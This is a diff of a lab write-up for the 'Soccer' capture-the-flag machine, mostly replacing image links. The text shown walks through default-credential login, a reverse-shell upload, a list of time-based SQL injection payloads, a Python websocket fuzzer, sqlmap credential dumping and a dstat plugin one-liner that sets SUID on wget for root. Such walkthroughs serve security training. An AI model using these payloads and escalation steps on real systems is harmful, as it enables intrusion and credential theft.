@@ -1,3 +1,4 @@
+# Soccer
 Let’s start with an nmap scan
 
 ```bash
@@ -94,7 +95,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 From here we can simply visit the website
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/152be991-f7dd-4409-9d16-e25fcb09a697/Untitled.png)
+![Untitled](https://github.com/Wanasgheo/Writeups/assets/111740362/0043bc97-84e8-4a6e-b25c-6789902cc678)
 
 Nothing cool here, so we can try to run gobuster to spot some hidden folders
 
@@ -108,41 +109,39 @@ Nothing cool here, so we can try to run gobuster to spot some hidden folders
 
 There is the `/tiny` page that we can visit where there is a login form
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/41970ee5-bdf3-4530-9512-14ef91e02924/Untitled.png)
+![Untitled(1)](https://github.com/Wanasgheo/Writeups/assets/111740362/55ae54c3-8edf-4b07-ac25-80367e30004c)
 
-By looking at the source code we can find the source code of the framework used, which is used
+By looking at the source code we can find the source code of the used framework
 
  https://github.com/prasathmani/tinyfilemanager
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0cee10e2-09d1-469e-b611-d2884efb1e73/Untitled.png)
-
 From there we can see that there are some default credentials, that we can try to use.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/26038530-a894-43e6-830a-4993a744e37e/Untitled.png)
+![Untitled(2)](https://github.com/Wanasgheo/Writeups/assets/111740362/6d905f4a-bd89-49db-bfee-0de00d1eb019)
 
 That could be even found by searching the version online which will redirect us to an exploit of a CVE
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d4071bbd-4c53-41f1-9bcd-9f5b13ca3478/Untitled.png)
+![Untitled(3)](https://github.com/Wanasgheo/Writeups/assets/111740362/2cb93c48-951b-4486-a03a-153cdcaa2bd8)
 
 And if we try to insert them to the form we get the access
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/14b77ada-1158-4c48-8dea-c947503c0e47/Untitled.png)
+![Untitled(4)](https://github.com/Wanasgheo/Writeups/assets/111740362/f872245a-4d3c-42db-bf7f-5135b7fd1290)
 
 Now we have to find a way to get a foothold, here its kinda easy because we just have to upload a reverse shell and open it with the direct-link
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5e7e4c74-eb99-477e-a649-d61fb13f2cb4/Untitled.png)
+![Untitled(5)](https://github.com/Wanasgheo/Writeups/assets/111740362/d1789e3f-e802-4d3a-8940-222df1dca472)
 
 We just have to change the directory from tiny to uploads where we can upload and open files, then we got to listen and open the revshell
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1cf5f32a-c3b2-4a53-a9c8-f224a656d450/Untitled.png)
+![Untitled(6)](https://github.com/Wanasgheo/Writeups/assets/111740362/e038b53f-ae66-41c5-b6e8-4f93747b9819)
 
 Now we are not allowed to get the user flag, so we got to privesc to `player`
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/af7a02d3-b085-46a3-924c-ab9097637532/Untitled.png)
+![Untitled(7)](https://github.com/Wanasgheo/Writeups/assets/111740362/c7c62776-46c4-4253-8ed5-72cbe61dbd51)
 
-From the error page we get the version of the web-server or `nginx`
+From the error page we get the webserver's version which is `nginx`
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d82d2d04-3d4c-4f36-9520-ee9f95fa4e90/Untitled.png)
+![Untitled(8)](https://github.com/Wanasgheo/Writeups/assets/111740362/45e11fa8-159b-44be-9392-54fc150a11c8)
 
 So we can check to the root folder of it or the `/etc/nginx` where we can find some interesting stuffs.
 
@@ -172,19 +171,17 @@ server {
 
 As you can see here seems that there is an hidden `subdomain`, so we can add it to the `/etc/hosts`, and then visit it.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/088aee0e-e262-4495-bac0-f35ad8ebb159/Untitled.png)
+![Untitled(9)](https://github.com/Wanasgheo/Writeups/assets/111740362/00e932c5-12f7-456b-92d5-07b7189a718b)
 
 From there we can see that we are allowed to register and then login in it.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1cd9a3a9-3889-488b-9585-9b692fabb24a/Untitled.png)
+![Untitled(10)](https://github.com/Wanasgheo/Writeups/assets/111740362/839f2ae1-bab2-4b8b-9415-4783c19a8e66)
 
 We get redirected to the tickets page where we can’t do more but we can spot from  the source code that we are on a `websocket`
 
-![ws:// ⇒ means that this is a websocket](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/42f0c724-46f1-4bf0-a010-b5199fe1867e/Untitled.png)
+![Untitled(11)](https://github.com/Wanasgheo/Writeups/assets/111740362/71e3150d-a9b1-41eb-8208-44a0a26d116a)
 
-ws:// ⇒ means that this is a websocket
-
-So we are on a websocket, this means that to interact with it we have to create a special code in python that let us to comunicate with it.
+Being in a websocket So we are on a websocket, this means that to interact with it we have to create a special code in python that let us to comunicate with it.
 
 ```python
 import asyncio
@@ -220,13 +217,12 @@ asyncio.run(connect_websocket())
 
 And here is result that we get via bash
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/080ca6f4-cff1-457a-9f97-49d9ac05854a/Untitled.png)
+![Untitled(12)](https://github.com/Wanasgheo/Writeups/assets/111740362/b8824698-5246-4de8-a3d7-906f703847f8)
 
 Like this we’ve established a comunication with the ws, and now we can try to check if it is vulnerable to something like the `SQL Injection`.
+After some trial and error we see that there are no error messages so we have to exploit it with time-based payloads.
 
-By doing some trial and error we see that there are no error messages so we have to exploit it with time-based payloads.
-
-This is the paylaod used
+This is the used wordlist to spot the vuln
 
 ```
 sleep(5)#
@@ -325,11 +321,44 @@ OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
-After this we have to change a bit the source code to make it send all the lines as input, with the goal to trigger some vulns
+After this we have to change a bit the source code to make it send all the lines as input, with the goal to trigger some vuln
 
-code
+```python
+import asyncio
+import websockets
+
+async def connect_websocket():
+    async with websockets.connect("ws://soc-player.soccer.htb:9091/") as websocket:
+        print("WebSocket connection established.")
+        
+        while True:
+
+            wordlist = "timeBasedPayloads.txt"
+
+            with open(wordlist, "r") as list:
+
+                for payload in list:
+                    message = payload.strip()
+                    message = '{"id":' + f'"{message}"' + "}"
+                    print(message)
+                    
+                    if message.lower() == 'exit':
+                        break
+                    
+                    await websocket.send(message)
+                    print("Message sent.")
+                    
+                    response = await websocket.recv()
+                    print("Received message:", response)
+    
+    print("WebSocket connection closed.")
+
+asyncio.run(connect_websocket())
+```
 
 Here is the result
+
+![Untitled(28)](https://github.com/Wanasgheo/Writeups/assets/111740362/b0d372c6-d320-48bd-9f64-e814c2098f2d)
 
 As you can see with the input `{"id":"sleep(5)"#}` we get the desired delay of 5 second and same for next input or `{"id":"1 or sleep(5)#"}`.
 
@@ -438,8 +467,10 @@ python3 WebSocketSQLi.py
 # [1] zsh
 sqlmap -u "http://localhost:8081/?id=*" -p "id" -o --batch --dump --thread 30
 ```
+Here is the result
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8f5ea073-bae0-4b38-bbc2-ba5d688b8faf/Untitled.png)
+![Untitled(13)](https://github.com/Wanasgheo/Writeups/assets/111740362/11b755ed-69cf-4634-8bb8-eb8a5864f0b3)
+
 
 Instead we can only use Sqlmap by specifying the argument that we wanna pass through the request with the `--data` flag and specifying the cookie we like.
 
@@ -450,9 +481,8 @@ sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 50 --
 Here we added:
 
 - `--thread` To specify the number of threads to use, ‘cause by default is 1, and the max is 10 so we changed it from the source code to a max o 50
-    
-    ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95d95ea7-69eb-4105-91ed-eb761880c8b1/Untitled.png)
-    
+    ![Untitled(18)](https://github.com/Wanasgheo/Writeups/assets/111740362/517be57d-8bb0-4248-87ef-346cdb2a0420)
+
 - `--level 5` Or the max level of deepness to make it try all the possible payloads
 - `--risk 3` Even here the max level for more precision
 - `--batch` This will answer `Yes` to every proposed question by sqlmap
@@ -466,11 +496,11 @@ sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads --lev
 
 Here are the creds for the user player.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/eec34702-3832-4c31-902e-aa9c7e5b24cd/Untitled.png)
+![Untitled(14)](https://github.com/Wanasgheo/Writeups/assets/111740362/d80e6ef3-99bb-4762-a5ac-f2baf79e9e78)
 
 It turned out that password is the one of the `ssh` connection.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/133909a3-1279-4601-b71a-5e17fc58072e/Untitled.png)
+![Untitled(15)](https://github.com/Wanasgheo/Writeups/assets/111740362/b4152400-610b-4afb-b28a-170d2340dda4)
 
 Now we can finally fetch the `user.txt` flag
 
@@ -478,27 +508,27 @@ Now we can finally fetch the `user.txt` flag
 
 After the user we have to escalate to root, for this reason we got to fetch `linpeas.sh`, via python3 web-server
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/21cb62e0-bba1-4c00-98f9-82dc8e7af14e/Untitled.png)
+![Untitled(16)](https://github.com/Wanasgheo/Writeups/assets/111740362/cae066e9-9441-4b5a-86b0-29ba9f62d99c)
 
 By running it we can see that there is a strange command that we can run with the `SUID` bit set, or `doas`
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a931f072-fce5-4471-8a40-78d280298c8e/Untitled.png)
+![Untitled(17)](https://github.com/Wanasgheo/Writeups/assets/111740362/dd58ce76-dd56-4b9a-bdf8-dc6bd52302fd)
 
 As you can see it is not highlited by linpeas but it can be used to become root, because in it are stored the command that some users can run without password as other users
 
 By looking at the `doas.conf` file we can see this specifications
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bf46e151-52db-4ad2-86df-d79bdddd26e5/Untitled.png)
+![Untitled(19)](https://github.com/Wanasgheo/Writeups/assets/111740362/e21a39c3-138e-4d9d-8a5c-791639fad027)
 
 Here we can see that we’re allowed to run the command `/usr/bin/dstat` as root without any password which, even it is another command that can lead to a shell if we can run it as sudo. Basically it is used to see an overview of systems in real-time.
 
 So to get the root with it we need to run it as root, In this case we can’t use `sudo` to it but we have `doas` which does the same work as it; so by looking at this [link](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/) or even [gtfobins](https://gtfobins.github.io/gtfobins/dstat/#shell), we can simply add the `s` bit to a command to become root.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e75c0b48-c3c1-4f0d-abef-ae823bda1298/Untitled.png)
+![Untitled(20)](https://github.com/Wanasgheo/Writeups/assets/111740362/22249f38-3110-4f1e-b0d9-b57cc38d482c)
 
 The idea is simple we got to create a new plugin that we can insert in the `/usr/local/share/dstat` folder, where the command fetch the python files as you can see below.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c8dfa952-b3fc-4ef3-8793-b4f2c266ff65/Untitled.png)
+![Untitled(21)](https://github.com/Wanasgheo/Writeups/assets/111740362/54f0c075-6ebd-4f19-8537-d9e76cb5e64a)
 
 So we simply have to add a python script that add the `s` bit to a command and then run it with doas
 
@@ -508,26 +538,26 @@ echo 'import os; os.system("chmod +s /usr/bin/wget")' > /usr/local/share/dstat/d
 
 To check if it worked we can use the command `dstat --list`
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/417d9554-ded2-4416-ad36-a845777aeb87/Untitled.png)
+![Untitled(22)](https://github.com/Wanasgheo/Writeups/assets/111740362/773fe794-86eb-44ca-b3d9-530b5ba3577d)
 
 The plugin got added so now we can run it as `root` with `doas`
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f34487f2-50fd-4268-b5d6-e5b1e51d994e/Untitled.png)
+![Untitled(23)](https://github.com/Wanasgheo/Writeups/assets/111740362/33c4987b-0598-431d-97bb-9dd82b81cbcc)
 
 Don’t worry about the error it worked anyway, so by checking the permission of `wget`
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a67ef6bd-be7c-48f0-88d4-829e44063274/Untitled.png)
+![Untitled(24)](https://github.com/Wanasgheo/Writeups/assets/111740362/22c9b103-14cc-4bd9-b716-0e43cbcd04b4)
 
 So now we just have to follow the instruction of `[gtfobins](https://gtfobins.github.io/gtfobins/wget/#sudo)` to become root with `wget`.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1e44d39d-e179-406f-b127-5b519609af7a/Untitled.png)
+![Untitled(25)](https://github.com/Wanasgheo/Writeups/assets/111740362/e341c10c-d3f8-4f44-b5fd-b57d075a14e7)
 
 By following the instructions
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4011535d-da02-473e-ac9d-c11018269b52/Untitled.png)
+![Untitled(26)](https://github.com/Wanasgheo/Writeups/assets/111740362/c403ed64-b43b-44a0-a32a-21dc950d7773)
 
 And we are root so now we can fetch even the `root` flag
 
-We did it, in about 7 days and some help 😂
+We did it!
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5a258fea-4b21-4b95-8f71-3dc0435aebd6/Untitled.png)
+![Untitled(27)](https://github.com/Wanasgheo/Writeups/assets/111740362/de6902cd-2f32-466f-9963-236d41e7f988)
